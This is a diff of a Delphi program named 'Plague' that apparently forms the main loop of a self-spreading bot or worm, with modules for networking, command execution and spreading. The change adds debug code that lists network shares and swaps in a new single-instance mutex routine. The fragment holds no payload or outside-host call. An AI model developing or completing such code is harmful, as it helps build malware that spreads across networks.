@@ -4,16 +4,25 @@ program Plague;
 
 uses
   Debug,
-  NetModule, Tools,
-  Classes, Windows, SysUtils, CmdWorker, Spread;
+  NetModule, Tools, Spread,
+  Classes, Windows, SysUtils, CmdWorker;
 
 var
   J, I: LongInt;
   CmdID, ToAbort: String;
 
+  D: TStringList;
+
 {$R *.res}
 
 Begin
+  Writeln(MaxInt div SizeOf(TNetResource) - 1);
+  D:=TStringList.Create;
+  EnumNetworkResources(Nil, D);
+  For J:=0 to D.Count-1 do Writeln(D.Strings[J]);
+  D.Free;
+  writeln('Complete.');
+  Readln;
   SetLastError(0);
   if ParamStr(1)='/open' then ShellExecute(0, 'open', 'explorer.exe',
     PChar(ParamStr(2)), nil, SW_NORMAL);
@@ -23,9 +32,8 @@ Begin
   if ParamStr(2)='/removeold' then
     if FileExists(ParamStr(0)+'.old') then DeleteFile(ParamStr(0)+'.old');
   if Settings.ReadInteger('General', 'FirstRun', 1) = 1 then DoFirstRun;
-  Mutex:=CreateMutex(Nil, True, PChar(Settings.ReadString('General', 'Mutex', 'Plague')));
-  if GetLastError=ERROR_ALREADY_EXIST then Halt(0);
-  ChDir(Base);
+  MutexMagic;
+  //ChDir(Base);
 
   Net:=TNet.Create(Nil);
   Repeat
